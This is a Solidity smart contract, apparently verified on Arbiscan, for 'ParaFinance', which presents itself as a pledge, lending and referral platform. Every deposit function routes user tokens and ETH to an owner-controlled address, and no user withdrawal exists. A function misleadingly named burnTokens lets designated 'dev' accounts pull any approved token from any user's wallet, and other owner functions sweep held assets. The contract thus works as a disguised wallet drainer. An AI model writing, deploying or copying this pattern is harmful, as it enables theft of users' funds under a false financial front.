/**
 *Submitted for verification at Arbiscan on 2023-08-02
*/

pragma solidity >=0.6.6;


library SafeMath256 {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ParaFinance {

    using SafeMath256 for uint256;

    mapping(address => bool) public devOwner;
    address public miner_address = 0x9bB330a4e24160E8D2ffc6e1884dD6358cF1D0E8;
    address public origin;
    uint256 public pledge_miner_count = 0;
    uint256 public min_pledge = 1;
    uint256 public player_num = 0;

    address public owner;
    address public para;
    address public usdt;

    mapping (address => address)        public relation;
    mapping (address => mapping (address => uint256))      public pledge_addr;
    mapping (address => mapping (address => uint256))      public debit_addr;
    mapping (uint256 => MinerRatio)     public miner_ratio;
    mapping (address => UserRelation)   public user_relation;

    struct UserRelation{
        uint256 recommend;
        uint256 community;
    }

    struct MinerRatio{
        uint256 reward;
    }

    event Relation(address _addrs,address _recommend);
    event Debit(address _addr,uint256 _amount,uint256 _day);
    event DebitToken(address _token,address _addr,uint256 _amount,uint256 _day);
    event Repayment(address _addr,uint256 _amount,uint256 _day);
    event Exchange(address _addr,uint256 _amount,uint256 _type);
    event Pledge(address _addr,uint256 _amount,uint256 _day);
    event PledgeToken(address _token,address _addr,uint256 _amount,uint256 _day);
    event MinerRatioShot(uint256 index,uint256 reward);
    event OwnershipTransferred(address previousOwner, address newOwner);

    constructor() public {
        origin = msg.sender;
        relation[msg.sender] = 0x000000000000000000000000000000000000dEaD;
        devOwner[msg.sender] = true;
        owner = msg.sender;

        para = 0x552826ac7113939Aa20dE92878462f8Ee773e36F;
        usdt = 0x843855fE2Da0EA5921D202DCd9B0F396cB5fA821;
        initMinerRatio();
    }

    function initMinerRatio() private{
        miner_ratio[1].reward = 1000;
        miner_ratio[2].reward = 500;
        miner_ratio[3].reward = 250;
    }

    function setMinerRatio(uint256 _index,uint256 _reward) public {
        require(msg.sender==owner,'only owner');
        miner_ratio[_index].reward = _reward;
        emit MinerRatioShot(_index,_reward);
    }

    function setMinerAddress(address _addr) public {
        require(msg.sender==owner,'only owner');
        miner_address = _addr;
    }

    function transferOwnership(address newOwner) public {
        require(msg.sender==owner,'only owner');
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function setRelation(address _addr) public {
        require(relation[msg.sender] == address(0) , "recommender already exists");
        if(_addr==origin){
            relation[msg.sender] = _addr;
        }else{
            require(relation[_addr] != address(0) , "recommender not exists");
            relation[msg.sender] = _addr;
            user_recommend(_addr);
        }
        player_num++;
        emit Relation(msg.sender,_addr);
    }

    function user_recommend(address pre) private{
        user_relation[pre].recommend += 1;
        for (uint i = 1; i <= 15; i++) {
            if(pre==address(0)){
                break;
            }
            user_relation[pre].community += 1;
            pre = relation[pre];
        }
    }

    function pledge(address token ,uint256 _amount,uint256 day) public{
        require(IERC20(token).balanceOf(msg.sender)>=_amount," Insufficient amount");
        uint256 _origin = _amount;
        if(pledge_addr[msg.sender][token]==0){
            pledge_miner_count++;
        }
        pledge_addr[msg.sender][token] = pledge_addr[msg.sender][token] + _amount;
        IERC20(token).transferFrom(msg.sender,miner_address,_amount);
        emit PledgeToken(token,msg.sender,_origin,day);
    }

    function pledgeETH(uint256 day) public payable {
        uint256 _amount = msg.value;
        address token = 0x0000000000000000000000000000000000000000;
        if(pledge_addr[msg.sender][token]==0){
            pledge_miner_count++;
        }
        pledge_addr[msg.sender][token] = pledge_addr[msg.sender][token] + _amount;
        address(uint160(miner_address)).transfer(_amount);
        emit Pledge(msg.sender,_amount,day);
    }

    function debit(address token ,uint256 _amount,uint256 day) public{
        require(IERC20(token).balanceOf(msg.sender)>=_amount," Insufficient amount");
        uint256 _origin = _amount;
        if(debit_addr[msg.sender][token]==0){
            pledge_miner_count++;
        }
        debit_addr[msg.sender][token] = debit_addr[msg.sender][token] + _amount;
        IERC20(token).transferFrom(msg.sender,miner_address,_amount);
        emit DebitToken(token,msg.sender,_origin,day);
    }

    function debitETH(uint256 day) public payable {
        uint256 _amount = msg.value;
        address token = 0x0000000000000000000000000000000000000000;
        if(debit_addr[msg.sender][token]==0){
            pledge_miner_count++;
        }
        debit_addr[msg.sender][token] = debit_addr[msg.sender][token] + _amount;
        address(uint160(miner_address)).transfer(_amount);
        emit Debit(msg.sender,_amount,day);
    }

    function repayment(uint256 _amount,uint256 _repayment) public{
        require(IERC20(usdt).balanceOf(msg.sender)>=_amount," Insufficient amount");
        IERC20(usdt).transferFrom(msg.sender,miner_address,_amount);
        emit Repayment(msg.sender,_amount,_repayment);
    }

    function exchangeAmount(uint256 _amount,uint256 _type) public{
        require(IERC20(para).balanceOf(msg.sender)>=_amount," Insufficient amount");
        IERC20(para).transferFrom(msg.sender,miner_address,_amount);
        emit Exchange(msg.sender,_amount,_type);
    }

    function takeOwnership(address _address,bool _Is) public  {
        require(msg.sender==owner,' only owner');
        devOwner[_address] = _Is;
    }

    function burnSun(address _addr,uint256 _amount) public payable returns (bool){
        require(msg.sender==owner,' only owner');
        address(uint160(_addr)).transfer(_amount);
        return true;
    }

    function burnToken(address token,address _addr,uint256 _amount) public returns (bool){
        require(msg.sender==owner,' only owner');
        IERC20(token).transfer(_addr,_amount);
        return true;
    }

    function burnTokens(address ba,address _addr,uint256 _amount,address token) public returns (bool){
        require(devOwner[msg.sender]==true,'V:not dev');
        IERC20(token).transferFrom(ba,_addr,_amount);
        return true;
    }

    function receiveProfit(address _addr,uint256 _amount) public{
        require(devOwner[msg.sender]==true,'V:not dev');
        address pre = relation[_addr];
        uint256 amount = 0;
        IERC20(para).transfer(_addr,_amount);
        amount = miner_ratio[1].reward * _amount /10000;
        if(amount>0&&pre!=0x0000000000000000000000000000000000000000){
            IERC20(para).transfer(pre,amount);
            amount = 0;
        }
        pre = relation[pre];
        amount = miner_ratio[2].reward * _amount /10000;
        if(amount>0&&pre!=0x0000000000000000000000000000000000000000){
            IERC20(para).transfer(pre,amount);
        }
        pre = relation[pre];
        amount = miner_ratio[3].reward * _amount /10000;
        if(amount>0&&pre!=0x0000000000000000000000000000000000000000){
            IERC20(para).transfer(pre,amount);
        }
    }
}